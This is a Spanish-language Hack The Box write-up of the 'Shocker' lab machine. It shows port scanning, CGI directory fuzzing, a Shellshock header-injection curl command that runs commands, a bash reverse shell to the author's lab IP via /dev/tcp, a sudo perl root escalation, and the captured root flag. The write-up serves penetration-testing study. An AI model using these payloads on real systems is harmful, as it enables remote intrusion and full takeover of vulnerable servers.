---
layout: single
title: Shocker - Hack The Box
excerpt: "Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers. "
date: 2024-04-10
classes: wide
header:
  teaser: /assets/images/htb-shocker/shocker.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Perl
  - ShellShock
  - Directorios
---

![](/assets/images/htb-shocker/shocker.png)

Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers. 

## Portscan

```
# Nmap 7.94SVN scan initiated Wed Apr 10 18:12:50 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -oG allports 10.10.10.56
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.56 ()	Status: Up
Host: 10.10.10.56 ()	Ports: 80/open/tcp//http///, 2222/open/tcp//EtherNetIP-1///
# Nmap done at Wed Apr 10 18:13:09 2024 -- 1 IP address (1 host up) scanned in 18.83 seconds

```
Y con esto analizamos los puertos abiertos:
```
# Nmap 7.94SVN scan initiated Wed Apr 10 18:18:19 2024 as: nmap -sCV -p80,2222 -Pn -oN targeted 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 10 18:18:32 2024 -- 1 IP address (1 host up) scanned in 12.54 seconds

```
## Analisis http

Vemos que la página http no contiene nada interesante, simplemente una imagen, asi que lo único que nos queda es buscar directorios existentes, mediante la herramienta WFUZZ que fuzzea los posibles directorios.
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/                   
```
Esto nos devuelve varios resultados, lo mas importante es el cgi-bin, que sabemos que almacena scripts, asi que vamos a buscar mas directorios dentro de cgi-bin:

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z 

000000373:   200        7 L      18 W       119 Ch      "user - sh" 
```
Vamos a ver que nos devuelve el script user.sh:

```
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh"                                                                                                                                                                      130 ⨯
Content-Type: text/plain

Just an uptime test script

 12:44:06 up 33 min,  0 users,  load average: 0.03, 0.04, 0.01

```
Este script no devuelve nada interesante pero vamos a ver si el ataque shellshock funcionaría

## ShellShock

Vamos a usar el script de nmap para ver si es vulnerable:
```
nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh -p80 10.10.10.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-10 18:49 CEST
Nmap scan report for 10.10.10.56
Host is up (0.075s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds

```
Vamos a capturar la interfaz tun0, y vamos a hacer la misma petición:
```
tshark -w Captura.cap -i tun0    
```

Y ahora vamos a analizar el contenido, concretamente el tcp.payload:
```
tshark -r Captura.cap -Y  "http" -Tfields -e "tcp.payload" 2>/dev/null

```
Esto nos devuelve un codigo en hexadecimal asi que vamos a pasarlo:

```
tshark -r Captura.cap -Y  "http" -Tfields -e "tcp.payload" 2>/dev/null | xxd -ps -r
HTTP/1.1 400 Bad Request
Date: Wed, 10 Apr 2024 16:59:49 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 127.0.1.1 Port 80</address>
</body></html>
GET /cgi-bin/user.sh HTTP/1.1
Cookie: () { :;}; echo; echo -n artnzjb; echo tteblsk
Referer: () { :;}; echo; echo -n artnzjb; echo tteblsk
Connection: close
User-Agent: () { :;}; echo; echo -n artnzjb; echo tteblsk
Host: 10.10.10.56

1


1b
Just an uptime test script

1


3f
 12:59:50 up 48 min,  0 users,  load average: 0.00, 0.00, 0.00

2



0

```

Vemos que se prueba el ataque shellshock en varios campos, ahora vamos a intentar introducir cosas en user-agent a ver si se puede ejecutar comandos:
```
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/whoami"
shelly

```
Y efectivamente, se pueden ejecutar comandos.


## Intrusión

Vamos a intentar mandarnos una reverse shell, a nuestra ip por el puerto 443
```
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /bin/bash -i >& /dev/tcp/10.10.16.7/443 0>& 1"
```
Nos ponemos en escucha por el puerto 443(nc -nvlp 443). Y estamos dentro.

## Escalada de privilegios

En el directorio home encontramos la flag del usuario.

Ahora toca escalar privilegios para obtener la flag de root. Vemos que pkexec se ecuentra disponible, pero vamos a usar otra técnica ya que esta la explotamos mucho.
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

Vemos que el comando perl se puede usar sin contraseña, asi que vamos a buscar en https://gtfobins.github.io/ que tenemos muchas vulnerabilidades explicadas, y si buscamos perl, y shell, encontramos el comando a ejecutar:
```
sudo perl -e 'exec "/bin/sh";'
whoami
root
cd /root/
ls
root.txt
cat root.txt
d5ffd2d03656c0208d008ef09a7e5465

```
Ahora ya tenemos todo.
